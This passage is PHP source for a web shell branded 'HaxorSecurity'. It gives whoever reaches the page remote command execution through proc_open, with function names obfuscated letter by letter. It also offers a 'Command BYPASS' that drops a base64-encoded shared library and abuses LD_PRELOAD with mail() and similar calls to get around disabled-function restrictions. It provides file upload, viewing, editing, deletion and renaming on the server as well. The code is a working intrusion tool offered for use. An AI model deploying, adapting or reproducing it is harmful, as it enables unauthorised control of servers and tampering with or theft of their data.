AwAAAAAAAAAAECAAAAAAAAAQAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADiAAAAAQAAAAMAAAAAAAAAYBAgAAAAAABgEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA6AAAAAgAAAADAAAAAAAAAGgQIAAAAAAAaBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAO0AAAABAAAAMAAAAAAAAAAAAAAAAAAAAGgQAAAAAAAALQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAACYEAAAAAAAABgGAAAAAAAAGwAAAC0AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAsBYAAAAAAABLAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPsYAAAAAAAA9gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=';
        $cmdd = $_POST['cmd_input'];
        $meterpreter = $en($cmdd." > test.txt");
        $viewCommandResult = '<hr><p>Result: <font color="black">base64 : ' . $meterpreter .'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By HaxorSecurity</font><br><br></textarea>';        
        $a($full . '/chankro.so', $base($hook));
        $a($full . '/acpid.socket', $base($meterpreter));
        $p('CHANKRO=' . $full . '/acpid.socket');
        $p('LD_PRELOAD=' . $full . '/chankro.so');
        if(function_exists('mail')) {
            $m('a','a','a','a');
        } elseif(function_exists('mb_send_mail')) {
            $mb('a','a','a','a'); 
        } elseif(function_exists('error_log')) {
            $err('a',1,'a');
        } elseif(function_exists('imap_mail')) {
            $imp('a','a','a');
        }

    }elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo '<hr>Folder deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete folder!';
                }
            } else {
                if ($unl($fileToDelete)) {
                    echo '<hr>File deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete file!';
                }
            }
        } else {
            echo '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo '<hr>Item renamed successfully!';
            } else {
                echo '<hr>Error: Failed to rename item!';
            }
        } else {
            echo '<hr>Error: Item not found!';
        }
    }elseif (isset($_POST['cmd_biasa'])) {
            $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
            $pc = "f"."c"."l"."o"."s"."e";
            $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
            $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
            $command = $_POST['cmd_biasa'];
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = $pp($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = $stg($pipes[1]);
                $errors = $stg($pipes[2]);
                $pc($pipes[1]);
                $pc($pipes[2]);
                $ppc($process);
                if (!empty($errors)) {
                    $viewCommandResult = '<hr><p>Error: </p><textarea class="result-box">' . $htm($errors) . '</textarea>';
                } else {
                    $viewCommandResult = '<hr><p>Result: </p><textarea class="result-box">' . $htm($output) . '</textarea>';
                }
            } else {
                $viewCommandResult = 'Result:</p><textarea class="result-box">Error: Failed to execute command! </textarea>';
            }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = $fgc($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p>
            <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
            <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
            <input type="hidden" name="edit_file" value="' . $_POST['view_file'] . '">
            <input type="submit" value=" Save "></form></td>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    }  elseif (isset($_POST['edit_file'])) {
        $ef = $currentDirectory . '/' . $_POST['edit_file'];
        $newContent = $_POST['content'];
        if ($fpc($ef, $newContent) !== false) {
            echo '<hr>File Edited successfully! ' . $_POST['edit_file'].'<hr>';
        } else {
            echo '<hr>Error: Failed Edit File! ' . $_POST['edit_file'].'<hr>';

        }
    }

}

echo '<hr>DIR: ';

$directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
$homeLinkPrinted = false;
foreach ($directories as $index => $dir) {
    $currentPath .= DIRECTORY_SEPARATOR . $dir;
    if ($index == 0) {
        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    } else {
        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
}

echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
echo '<br>';
echo '<hr><form method="post" enctype="multipart/form-data">';
echo '<hr>';
echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
echo '<input type="submit" value="Upload File" name="submit">';
echo '</form><hr>';
echo '<table border="5"><tbody>
<tr>
<td>
<center>Command BYPASS<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form></center></td>

<td><center>Command BIASA<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_biasa" placeholder="Enter command"><input type="submit" value="Run Command"></form><center></td>

<td><center>Create Folder<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="folder_name" placeholder="Folder Name"><input type="submit" value="Create Folder"></form><center></td>
<td><center>Create File<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="file_name" placeholder="File Name"><input type="submit" value="Create File"></form></td></tr>
</tbody></table>';
echo $viewCommandResult;
echo '<table border=1>';
echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
foreach ($scd($currentDirectory) as $v) {
    $u = $ril($v);
    $s = $st($u);
    $itemLink = $isdir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($u)), -4);
    $writable = $isw($u);
    echo '<tr>
            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
            <td class="size">'.filesize($u).'</td>
            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.$htm($v).'"><input type="submit" value=" View "></form></center></td>
            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.$htm($v).'"><input type="submit" value="Delete"></form></center></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.$htm($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
        </tr>';
        
}

echo '</table>';
function deleteDirectory($dir) {
   $unl = "u"."n"."l"."i"."n"."k";
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return $unl($dir);
    }
    $scd = "s"."c"."a"."n"."d"."i"."r";
    foreach ($scd($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
